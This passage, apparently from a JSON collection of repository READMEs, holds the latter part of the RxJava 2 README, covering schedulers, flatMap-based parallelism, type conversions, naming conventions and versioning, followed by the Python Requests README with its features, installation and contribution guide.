.subscribeOn(Schedulers.io())\n  .observeOn(Schedulers.single())\n  .subscribe(System.out::println, Throwable::printStackTrace);\n\nThread.sleep(2000); // <--- wait for the flow to finish\nThis style of chaining methods is called a fluent API which resembles the builder pattern. However, RxJava's reactive types are immutable; each of the method calls returns a new Flowable with added behavior. To illustrate, the example can be rewritten as follows:\nFlowable<String> source = Flowable.fromCallable(() -> {\n    Thread.sleep(1000); //  imitate expensive computation\n    return \"Done\";\n});\n\nFlowable<String> runBackground = source.subscribeOn(Schedulers.io());\n\nFlowable<String> showForeground = runBackground.observeOn(Schedulers.single());\n\nshowForeground.subscribe(System.out::println, Throwable::printStackTrace);\n\nThread.sleep(2000);\nTypically, you can move computations or blocking IO to some other thread via subscribeOn. Once the data is ready, you can make sure they get processed on the foreground or GUI thread via observeOn.\nSchedulers\nRxJava operators don't work with Threads or ExecutorServices directly but with so called Schedulers that abstract away sources of concurrency behind a uniform API. RxJava 2 features several standard schedulers accessible via Schedulers utility class.\n\nSchedulers.computation(): Run computation intensive work on a fixed number of dedicated threads in the background. Most asynchronous operator use this as their default Scheduler.\nSchedulers.io(): Run I/O-like or blocking operations on a dynamically changing set of threads.\nSchedulers.single(): Run work on a single thread in a sequential and FIFO manner.\nSchedulers.trampoline(): Run work in a sequential and FIFO manner in one of the participating threads, usually for testing purposes.\n\nThese are available on all JVM platforms but some specific platforms, such as Android, have their own typical Schedulers defined: AndroidSchedulers.mainThread(), SwingScheduler.instance() or JavaFXSchedulers.gui().\nIn addition, there is option to wrap an existing Executor (and its subtypes such as ExecutorService) into a Scheduler via Schedulers.from(Executor). This can be used, for example, to have a larger but still fixed pool of threads (unlike computation() and io() respectively).\nThe Thread.sleep(2000); at the end is no accident. In RxJava the default Schedulers run on daemon threads, which means once the Java main thread exits, they all get stopped and background computations may never happen. Sleeping for some time in this example situations lets you see the output of the flow on the console with time to spare.\nConcurrency within a flow\nFlows in RxJava are sequential in nature split into processing stages that may run concurrently with each other:\nFlowable.range(1, 10)\n  .observeOn(Schedulers.computation())\n  .map(v -> v * v)\n  .blockingSubscribe(System.out::println);\nThis example flow squares the numbers from 1 to 10 on the computation Scheduler and consumes the results on the \"main\" thread (more precisely, the caller thread of blockingSubscribe). However, the lambda v -> v * v doesn't run in parallel for this flow; it receives the values 1 to 10 on the same computation thread one after the other.\nParallel processing\nProcessing the numbers 1 to 10 in parallel is a bit more involved:\nFlowable.range(1, 10)\n  .flatMap(v ->\n      Flowable.just(v)\n        .subscribeOn(Schedulers.computation())\n        .map(w -> w * w)\n  )\n  .blockingSubscribe(System.out::println);\nPractically, parallelism in RxJava means running independent flows and merging their results back into a single flow. The operator flatMap does this by first mapping each number from 1 to 10 into its own individual Flowable, runs them and merges the computed squares.\nNote, however, that flatMap doesn't guarantee any order and the end result from the inner flows may end up interleaved. There are alternative operators:\n\nconcatMap that maps and runs one inner flow at a time and\nconcatMapEager which runs all inner flows \"at once\" but the output flow will be in the order those inner flows were created.\n\nAlternatively, the Flowable.parallel() operator and the ParallelFlowable type help achieve the same parallel processing pattern:\nFlowable.range(1, 10)\n  .parallel()\n  .runOn(Schedulers.computation())\n  .map(v -> v * v)\n  .sequential()\n  .blockingSubscribe(System.out::println);\nDependent sub-flows\nflatMap is a powerful operator and helps in a lot of situations. For example, given a service that returns a Flowable, we'd like to call another service with values emitted by the first service:\nFlowable<Inventory> inventorySource = warehouse.getInventoryAsync();\n\ninventorySource.flatMap(inventoryItem ->\n    erp.getDemandAsync(inventoryItem.getId())\n    .map(demand \n        -> System.out.println(\"Item \" + inventoryItem.getName() + \" has demand \" + demand));\n  )\n  .subscribe();\nContinuations\nSometimes, when an item has become available, one would like to perform some dependent computations on it. This is sometimes called continuations and, depending on what should happen and what types are involved, may involve various operators to accomplish.\nDependent\nThe most typical scenario is to given a value, invoke another service, await and continue with its result:\nservice.apiCall()\n.flatMap(value -> service.anotherApiCall(value))\n.flatMap(next -> service.finalCall(next))\nIt is often the case also that later sequences would require values from earlier mappings. This can be achieved by moving the outer flatMap into the inner parts of the previous flatMap for example:\nservice.apiCall()\n.flatMap(value ->\n    service.anotherApiCall(value)\n    .flatMap(next -> service.finalCallBoth(value, next))\n)\nHere, the original value will be available inside the inner flatMap, courtesy of lambda variable capture.\nNon-dependent\nIn other scenarios, the result(s) of the first source/dataflow is irrelevant and one would like to continue with a quasi independent another source. Here, flatMap works as well:\nObservable continued = sourceObservable.flatMapSingle(ignored -> someSingleSource)\ncontinued.map(v -> v.toString())\n  .subscribe(System.out::println, Throwable::printStackTrace);\nhowever, the continuation in this case stays Observable instead of the likely more appropriate Single. (This is understandable because\nfrom the perspective of flatMapSingle, sourceObservable is a multi-valued source and thus the mapping may result in multiple values as well).\nOften though there is a way that is somewhat more expressive (and also lower overhead) by using Completable as the mediator and its operator andThen to resume with something else:\nsourceObservable\n  .ignoreElements()           // returns Completable\n  .andThen(someSingleSource)\n  .map(v -> v.toString())\nThe only dependency between the sourceObservable and the someSingleSource is that the former should complete normally in order for the latter to be consumed.\nDeferred-dependent\nSometimes, there is an implicit data dependency between the previous sequence and the new sequence that, for some reason, was not flowing through the \"regular channels\". One would be inclined to write such continuations as follows:\nAtomicInteger count = new AtomicInteger();\n\nObservable.range(1, 10)\n  .doOnNext(ignored -> count.incrementAndGet())\n  .ignoreElements()\n  .andThen(Single.just(count.get()))\n  .subscribe(System.out::println);\nUnfortunately, this prints 0 because Single.just(count.get()) is evaluated at assembly time when the dataflow hasn't even run yet. We need something that defers the evaluation of this Single source until runtime when the main source completes:\nAtomicInteger count = new AtomicInteger();\n\nObservable.range(1, 10)\n  .doOnNext(ignored -> count.incrementAndGet())\n  .ignoreElements()\n  .andThen(Single.defer(() -> Single.just(count.get())))\n  .subscribe(System.out::println);\nor\nAtomicInteger count = new AtomicInteger();\n\nObservable.range(1, 10)\n  .doOnNext(ignored -> count.incrementAndGet())\n  .ignoreElements()\n  .andThen(Single.fromCallable(() -> count.get()))\n  .subscribe(System.out::println);\nType conversions\nSometimes, a source or service returns a different type than the flow that is supposed to work with it. For example, in the inventory example above, getDemandAsync could return a Single<DemandRecord>. If the code example is left unchanged, this will result in a compile time error (however, often with misleading error message about lack of overload).\nIn such situations, there are usually two options to fix the transformation: 1) convert to the desired type or 2) find and use an overload of the specific operator supporting the different type.\nConverting to the desired type\nEach reactive base class features operators that can perform such conversions, including the protocol conversions, to match some other type. The following matrix shows the available conversion options:\n\n\n\n\nFlowable\nObservable\nSingle\nMaybe\nCompletable\n\n\n\n\nFlowable\n\ntoObservable\nfirst, firstOrError, single, singleOrError, last, lastOrError1\nfirstElement, singleElement, lastElement\nignoreElements\n\n\nObservable\ntoFlowable2\n\nfirst, firstOrError, single, singleOrError, last, lastOrError1\nfirstElement, singleElement, lastElement\nignoreElements\n\n\nSingle\ntoFlowable3\ntoObservable\n\ntoMaybe\nignoreElement\n\n\nMaybe\ntoFlowable3\ntoObservable\ntoSingle\n\nignoreElement\n\n\nCompletable\ntoFlowable\ntoObservable\ntoSingle\ntoMaybe\n\n\n\n\n1: When turning a multi-valued source into a single valued source, one should decide which of the many source values should be considered as the result.\n2: Turning an Observable into Flowable requires an additional decision: what to do with the potential unconstrained flow\nof the source Observable? There are several strategies available (such as buffering, dropping, keeping the latest) via the BackpressureStrategy parameter or via standard Flowable operators such as onBackpressureBuffer, onBackpressureDrop, onBackpressureLatest which also\nallow further customization of the backpressure behavior.\n3: When there is only (at most) one source item, there is no problem with backpressure as it can be always stored until the downstream is ready to consume.\nUsing an overload with the desired type\nMany frequently used operator has overloads that can deal with the other types. These are usually named with the suffix of the target type:\n\n\n\nOperator\nOverloads\n\n\n\n\nflatMap\nflatMapSingle, flatMapMaybe, flatMapCompletable, flatMapIterable\n\n\nconcatMap\nconcatMapSingle, concatMapMaybe, concatMapCompletable, concatMapIterable\n\n\nswitchMap\nswitchMapSingle, switchMapMaybe, switchMapCompletable\n\n\n\nThe reason these operators have a suffix instead of simply having the same name with different signature is type erasure. Java doesn't consider signatures such as operator(Function<T, Single<R>>) and operator(Function<T, Maybe<R>>) different (unlike C#) and due to erasure, the two operators would end up as duplicate methods with the same signature.\nOperator naming conventions\nNaming in programming is one of the hardest things as names are expected to be not long, expressive, capturing and easily memorable. Unfortunately, the target language (and pre-existing conventions) may not give too much help in this regard (unusable keywords, type erasure, type ambiguities, etc.).\nUnusable keywords\nIn the original Rx.NET, the operator that emits a single item and then completes is called Return(T). Since the Java convention is to have a lowercase letter start a method name, this would have been return(T) which is a keyword in Java and thus not available. Therefore, RxJava chose to name this operator just(T). The same limitation exists for the operator Switch, which had to be named switchOnNext. Yet another example is Catch which was named onErrorResumeNext.\nType erasure\nMany operators that expect the user to provide some function returning a reactive type can't be overloaded because the type erasure around a Function<T, X> turns such method signatures into duplicates. RxJava chose to name such operators by appending the type as suffix as well:\nFlowable<R> flatMap(Function<? super T, ? extends Publisher<? extends R>> mapper)\n\nFlowable<R> flatMapMaybe(Function<? super T, ? extends MaybeSource<? extends R>> mapper)\nType ambiguities\nEven though certain operators have no problems from type erasure, their signature may turn up being ambiguous, especially if one uses Java 8 and lambdas. For example, there are several overloads of concatWith taking the various other reactive base types as arguments (for providing convenience and performance benefits in the underlying implementation):\nFlowable<T> concatWith(Publisher<? extends T> other);\n\nFlowable<T> concatWith(SingleSource<? extends T> other);\nBoth Publisher and SingleSource appear as functional interfaces (types with one abstract method) and may encourage users to try to provide a lambda expression:\nsomeSource.concatWith(s -> Single.just(2))\n.subscribe(System.out::println, Throwable::printStackTrace);\nUnfortunately, this approach doesn't work and the example does not print 2 at all. In fact, since version 2.1.10, it doesn't\neven compile because at least 4 concatWith overloads exist and the compiler finds the code above ambiguous.\nThe user in such situations probably wanted to defer some computation until the someSource has completed, thus the correct\nunambiguous operator should have been defer:\nsomeSource.concatWith(Single.defer(() -> Single.just(2)))\n.subscribe(System.out::println, Throwable::printStackTrace);\nSometimes, a suffix is added to avoid logical ambiguities that may compile but produce the wrong type in a flow:\nFlowable<T> merge(Publisher<? extends Publisher<? extends T>> sources);\n\nFlowable<T> mergeArray(Publisher<? extends T>... sources);\nThis can get also ambiguous when functional interface types get involved as the type argument T.\nError handling\nDataflows can fail, at which point the error is emitted to the consumer(s). Sometimes though, multiple sources may fail at which point there is a choice whether or not wait for all of them to complete or fail. To indicate this opportunity, many operator names are suffixed with the DelayError words (while others feature a delayError or delayErrors boolean flag in one of their overloads):\nFlowable<T> concat(Publisher<? extends Publisher<? extends T>> sources);\n\nFlowable<T> concatDelayError(Publisher<? extends Publisher<? extends T>> sources);\nOf course, suffixes of various kinds may appear together:\nFlowable<T> concatArrayEagerDelayError(Publisher<? extends T>... sources);\nBase class vs base type\nThe base classes can be considered heavy due to the sheer number of static and instance methods on them. RxJava 2's design was heavily influenced by the Reactive Streams specification, therefore, the library features a class and an interface per each reactive type:\n\n\n\nType\nClass\nInterface\nConsumer\n\n\n\n\n0..N backpressured\nFlowable\nPublisher1\nSubscriber\n\n\n0..N unbounded\nObservable\nObservableSource2\nObserver\n\n\n1 element or error\nSingle\nSingleSource\nSingleObserver\n\n\n0..1 element or error\nMaybe\nMaybeSource\nMaybeObserver\n\n\n0 element or error\nCompletable\nCompletableSource\nCompletableObserver\n\n\n\n1The org.reactivestreams.Publisher is part of the external Reactive Streams library. It is the main type to interact with other reactive libraries through a standardized mechanism governed by the Reactive Streams specification.\n2The naming convention of the interface was to append Source to the semi-traditional class name. There is no FlowableSource since Publisher is provided by the Reactive Streams library (and subtyping it wouldn't have helped with interoperation either). These interfaces are, however, not standard in the sense of the Reactive Streams specification and are currently RxJava specific only.\nFurther reading\nFor further details, consult the wiki.\nCommunication\n\nGoogle Group: RxJava\nTwitter: @RxJava\nGitHub Issues\nStackOverflow: rx-java and rx-java2\nGitter.im\n\nVersioning\nVersion 2.x is now considered stable and final. Version 1.x will be supported for several years along with 2.x. Enhancements and bugfixes will be synchronized between the two in a timely manner.\nMinor 2.x increments (such as 2.1, 2.2, etc) will occur when non-trivial new functionality is added or significant enhancements or bug fixes occur that may have behavioral changes that may affect some edge cases (such as dependence on behavior resulting from a bug). An example of an enhancement that would classify as this is adding reactive pull backpressure support to an operator that previously did not support it. This should be backwards compatible but does behave differently.\nPatch 2.x.y increments (such as 2.0.0 -> 2.0.1, 2.3.1 -> 2.3.2, etc) will occur for bug fixes and trivial functionality (like adding a method overload). New functionality marked with an @Beta or @Experimental annotation can also be added in patch releases to allow rapid exploration and iteration of unstable new functionality.\n@Beta\nAPIs marked with the @Beta annotation at the class or method level are subject to change. They can be modified in any way, or even removed, at any time. If your code is a library itself (i.e. it is used on the CLASSPATH of users outside your own control), you should not use beta APIs, unless you repackage them (e.g. using ProGuard, shading, etc).\n@Experimental\nAPIs marked with the @Experimental annotation at the class or method level will almost certainly change. They can be modified in any way, or even removed, at any time. You should not use or rely on them in any production code. They are purely to allow broad testing and feedback.\n@Deprecated\nAPIs marked with the @Deprecated annotation at the class or method level will remain supported until the next major release but it is recommended to stop using them.\nio.reactivex.internal.*\nAll code inside the io.reactivex.internal.* packages is considered private API and should not be relied upon at all. It can change at any time.\nFull Documentation\n\nWiki\nJavadoc\nLatest snaphot Javadoc\nJavadoc of a specific release version: http://reactivex.io/RxJava/2.x/javadoc/2.x.y/\n\nBinaries\nBinaries and dependency information for Maven, Ivy, Gradle and others can be found at http://search.maven.org.\nExample for Gradle:\ncompile 'io.reactivex.rxjava2:rxjava:x.y.z'\nand for Maven:\n<dependency>\n    <groupId>io.reactivex.rxjava2</groupId>\n    <artifactId>rxjava</artifactId>\n    <version>x.y.z</version>\n</dependency>\nand for Ivy:\n<dependency org=\"io.reactivex.rxjava2\" name=\"rxjava\" rev=\"x.y.z\" />\nSnapshots are available via https://oss.jfrog.org/libs-snapshot/io/reactivex/rxjava2/rxjava/\nrepositories {\n    maven { url 'https://oss.jfrog.org/libs-snapshot' }\n}\n\ndependencies {\n    compile 'io.reactivex.rxjava2:rxjava:2.2.0-SNAPSHOT'\n}\nBuild\nTo build:\n$ git clone git@github.com:ReactiveX/RxJava.git\n$ cd RxJava/\n$ ./gradlew build\n\nFurther details on building can be found on the Getting Started page of the wiki.\nBugs and Feedback\nFor bugs, questions and discussions please use the Github Issues.\nLICENSE\nCopyright (c) 2016-present, RxJava Contributors.\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\nhttp://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License."}, {"title": "kennethreitz/requests", "language": "Python", "content": "Requests: HTTP for Humans\u2122\n\n\n\n\n\n\nRequests is the only Non-GMO HTTP library for Python, safe for human\nconsumption.\n\nBehold, the power of Requests:\n>>> import requests\n>>> r = requests.get('https://api.github.com/user', auth=('user', 'pass'))\n>>> r.status_code\n200\n>>> r.headers['content-type']\n'application/json; charset=utf8'\n>>> r.encoding\n'utf-8'\n>>> r.text\nu'{\"type\":\"User\"...'\n>>> r.json()\n{u'disk_usage': 368627, u'private_gists': 484, ...}\n\nSee the similar code, sans Requests.\n\nRequests allows you to send organic, grass-fed HTTP/1.1 requests,\nwithout the need for manual labor. There's no need to manually add query\nstrings to your URLs, or to form-encode your POST data. Keep-alive and\nHTTP connection pooling are 100% automatic, thanks to\nurllib3.\nBesides, all the cool kids are doing it. Requests is one of the most\ndownloaded Python packages of all time, pulling in over 11,000,000\ndownloads every month. You don't want to be left out!\nFeature Support\nRequests is ready for today's web.\n\nInternational Domains and URLs\nKeep-Alive & Connection Pooling\nSessions with Cookie Persistence\nBrowser-style SSL Verification\nBasic/Digest Authentication\nElegant Key/Value Cookies\nAutomatic Decompression\nAutomatic Content Decoding\nUnicode Response Bodies\nMultipart File Uploads\nHTTP(S) Proxy Support\nConnection Timeouts\nStreaming Downloads\n.netrc Support\nChunked Requests\n\nRequests officially supports Python 2.7 & 3.4\u20133.7, and runs great on\nPyPy.\nInstallation\nTo install Requests, simply use pipenv (or pip, of\ncourse):\n$ pipenv install requests\n\u2728\ud83c\udf70\u2728\n\nSatisfaction guaranteed.\nDocumentation\nFantastic documentation is available at\nhttp://docs.python-requests.org/, for a limited time only.\nHow to Contribute\n\nBecome more familiar with the project by reading our Contributor's Guide and our development philosophy.\nCheck for open issues or open a fresh issue to start a discussion\naround a feature idea or a bug. There is a Contributor\nFriendly\ntag for issues that should be ideal for people who are not very\nfamiliar with the codebase yet.\nFork the repository on\nGitHub to start making your changes to the master branch (or\nbranch off of it).\nWrite a test which shows that the bug was fixed or that the feature\nworks as expected.\nSend a pull request and bug the maintainer until it gets merged and\npublished. :) Make sure to add yourself to\nAUTHORS."}]